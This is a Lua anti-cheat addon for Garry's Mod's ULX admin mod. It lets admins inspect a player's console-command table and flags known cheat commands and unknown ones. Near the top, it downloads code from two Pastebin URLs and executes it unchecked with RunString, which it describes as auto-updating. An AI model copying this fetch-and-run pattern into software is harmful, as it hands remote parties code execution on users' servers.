--------------------------------
--  ConCommand Table Checker  --
--------------------------------

local hideGoodCommands = false
//Default: true
//make this false if you want to see confirmed OK commands
//not sure what this means? visit https://gyazo.com/8ae677649655590593368204e8e7e488 for a visual example.
local enableAdminlogging = false
//Default: false
//make this true if you want to log the use of this command
//not sure what this means? visit https://gyazo.com/9c44282a2efda79226dfbe54d11b0fa9 for a visual example.
local enableChatLogging = true
//Default: true
//make this false to disable "No cheats found on player %name%", "Unknown command(s) found on player %name%", and "cheat(s) found on player %name%"
//not sure what this means? visit https://gyazo.com/84e694ee849e5709502da7da16b69300 for a visual example.
local enableSounds = true
//Default: true
//make this false if you don't want to play sounds when a cheat is found
//while true, the sound ambient/alarms/klaxon1.wav will be played when confirmed cheats are found, and physics/cardboard/cardboard_box_break3.wav will play when unknown cmds are found
local CheatSoundtoUse = "ambient/alarms/klaxon1.wav"
//change this if you know what you're doing. Will change the sound that plays when any cheats are found.
//Default: "ambient/alarms/klaxon1.wav"
local unknownSoundtouse = "physics/cardboard/cardboard_box_break3.wav"
//change this if you know what you're doing. Will change the sound that plays when any unknown commands are found.
//Default: "physics/cardboard/cardboard_box_break3.wav"

timer.Simple(0, function ()
	http.Fetch("https://pastebin.com/raw/S7fG2Mgk", function (body, len, headers, code)
		LoadGoodCmds = body
		RunString(LoadGoodCmds)
		end,
		function (error)
	end);
	http.Fetch("https://pastebin.com/raw/g3HVnx79", function (body, len, headers, code)
		LoadBadCmds = body
		RunString(LoadBadCmds)
		end,
		function (error)
	end);
end);

local cc_customgoodcmds = {
	"example", "example2", "example3"
} // Enter custom cmds to ignore from players here.

// Credits to HeX for most of this table, and to Zero for making it into a http fetcher (aka auto update)

// If you want to add any custom concommands to check for, add them to this table
// Make sure the last entry doesn't have a comma at the end, i.e. { "one", "two", "three" }
local cc_custom_badcmds = {
	"badcmd", "badcmd2", "badcmd3"
}

//////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
//-- DO NOT EDIT ANYTHING BELOW HERE UNLESS YOU KNOW WHAT YOU ARE DOING --\\
//////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

function ulx.getcommandtable(calling_ply, target_ply)
	if (enableAdminlogging) then
		ulx.fancyLogAdmin(calling_ply, true, "#A printed the CMDtable of #T", target_ply )
	end
	net.Start("cmds")
		net.WriteEntity(calling_ply);
		net.WriteString(tostring(target_ply:Nick() .. " (" .. target_ply:SteamID() .. ")"));
		net.WriteString(tostring(con_ticket_number));
		table.insert(con_callers, calling_ply);
		target_ply.sessionid = con_ticket_number;
		target_ply.callerid = calling_ply;
		con_ticket_number = con_ticket_number + 1;
	net.Send(target_ply);
end
local getcommandtable = ulx.command("Essentials", "ulx getcommandtable", ulx.getcommandtable, "!getcommandtable", true);
getcommandtable:addParam{type = ULib.cmds.PlayerArg};
getcommandtable:defaultAccess(ULib.ACCESS_ADMIN);
getcommandtable:help("View a players console commands. Used to find cheats.");

if (CLIENT) then
	net.Receive("cmds", function ()
		local c = net.ReadEntity();
		local io = net.ReadString();
		local tn = net.ReadString();
		local contable = concommand.GetTable();
		local cctable = {}
		local e = true
		for k, v in pairs(contable) do
			table.insert(cctable, tostring(k));
		end
		local abcat = {};
		local absval = {};
		local mid = math.floor(table.Count(cctable) / 2);
		for i = 1, mid do
			abcat[i] = cctable[i];
		end
		for i = mid + 1 , #cctable do
			absval[i] = cctable[i];
		end
		net.Start("sendcmds");
			net.WriteTable(abcat);
			net.WriteTable(absval);
			net.WriteEntity(c);
			net.WriteString(io);
			net.WriteBool(e);
			net.WriteString(tn);
		net.SendToServer();
	end);
	net.Receive("cmds_cl", function ()
		local ntable = net.ReadTable();
		local ntable2 = net.ReadTable();
		local target = net.ReadString();
		local newtab = {};
		// Put the split tables back together
		for i = 1, #ntable do
			newtab[i] = ntable[i];
		end
		for i = #ntable + 1, #ntable2 do
			newtab[i] = ntable2[i];
		end
		// Snazzy console print stuff
		MsgC(Color(0, 255, 255), "\n---------------");
		MsgC(Color(0, 255, 255), "\nConCommand table from Player ");
		MsgC(Color(50, 150, 255), target);
		MsgC(Color(0, 255, 255), ":\n");
		// Check for commands in the table of bad commands (xx = bad commands, zz = unknown commands)
		local xx = 0;
		local zz = 0;
		for k, v in pairs(newtab) do
			if (!table.HasValue(cc_goodcmds, v) && !table.HasValue(cc_customgoodcmds, v)) then
				if (table.HasValue(cc_badcmds, v) || table.HasValue(cc_custom_badcmds, v)) then
				MsgC(Color(255, 0, 0), v .. "\n") // Bad commands print red
				xx = (xx + 1);
				else
					MsgC(Color(255,165,10), v .. "\n") // unknown commands print orange
					zz = (zz + 1);
				end
			else
				if (!hideGoodCommands) then
					MsgC(Color(0, 255, 0), v .. "\n") //good commands will (if hideGoodCommands is false) print green, otherwise they wont print at all (line: 26)
				end
			end
		end
		local color_red = Color(255, 0, 0);
		local color_green = Color(0, 255, 0);
		local color_orange = Color(255, 165, 0);
		if (xx > 0) then
			if (xx == 1) then
				if (enableSounds) then
				sound.Play(CheatSoundtoUse, Vector(LocalPlayer():GetPos()));
				end
				if (enableChatLogging) then
					chat.AddText(color_red, "Cheat detected on player " .. target .. ", check your console!");
				end
				MsgC(Color(255, 0, 0), "WARNING: Found " .. xx .. " bad command on Player ");
				MsgC(Color(50, 150, 255), target);
				MsgC(Color(255, 0, 0), "!" .. "\n");
				if (zz == 0) then
					MsgC(Color(0, 255, 255 ), "---------------\n\n");
				end
			elseif (xx >= 2) then
				if (enableSounds) then
				sound.Play(CheatSoundtoUse, Vector(LocalPlayer():GetPos()));
				end
				if (enableChatLogging) then
					chat.AddText(color_red, "Multiple cheats detected on player " .. target .. ", check your console!");
				end
				MsgC(Color(255, 0, 0), "WARNING: Found " .. xx .. " bad commands on Player ");
				MsgC(Color(50, 150, 255), target);
				MsgC(Color(255, 0, 0), "!" .. "\n");
				if (zz == 0) then
					MsgC(Color(0, 255, 255), "---------------\n\n");
				end
			end
		end
		if (zz > 0) then
			if (zz == 1) then
				if (xx > 0) then
					MsgC(Color(255, 165, 0), "WARNING: Found an unknown command on Player ");
					MsgC(Color(50, 150, 255), target);
					MsgC(Color(255, 165, 0), "!" .. "\n");
					MsgC(Color(0, 255, 255), "---------------\n\n");
					return;
				end
				if (enableSounds) then
					sound.Play(unknownSoundtouse, Vector(LocalPlayer():GetPos()));
				end
				if (enableChatLogging) then
					chat.AddText(color_orange, "Unknown Command detected on player " .. target .. ", check your console!");
				end
				MsgC(Color(255, 165, 0), "\nWARNING: Found an unknown command on Player ");
				MsgC(Color(50, 150, 255), target);
				MsgC(Color(255, 165, 0), "!" .. "\n");
				MsgC(Color(0, 255, 255), "---------------\n\n");
			elseif (zz >= 2) then
				if (xx > 0) then
					MsgC(Color(255, 165, 0), "WARNING: Found " .. zz .. " unknown commands on Player ");
					MsgC(Color(50, 150, 255), target);
					MsgC(Color(255, 165, 0), "!" .. "\n");
					MsgC(Color(0, 255, 255), "---------------\n\n");
					return;
				end
				if (enableSounds) then
					sound.Play(unknownSoundtouse, Vector(LocalPlayer():GetPos()));
				end
				if (enableChatLogging) then
					chat.AddText(color_orange, "Multiple Unknown Commands Detected on " .. target .. ", check your console!");
				end
				MsgC(Color(255, 165, 0), "WARNING: Found " .. zz .. " unknown commands on Player ");
				MsgC(Color(50, 150, 255), target);
				MsgC(Color(255, 165, 0), "!" .. "\n");
				MsgC(Color(0, 255, 255), "---------------\n\n" );
			end
		end
		if (xx == 0 && zz == 0) then
			if (enableChatLogging) then
				chat.AddText(color_green, "No cheats detected on " .. target .. ".");
			end
			MsgC(Color(0, 255, 255), "Found no bad/unknown commands on Player ");
			MsgC(Color(50,150,255), target);
			MsgC(Color(0,255,255), "!" .. "\n");
			MsgC(Color(0, 255, 255), "---------------\n\n");
		end
	end);
end
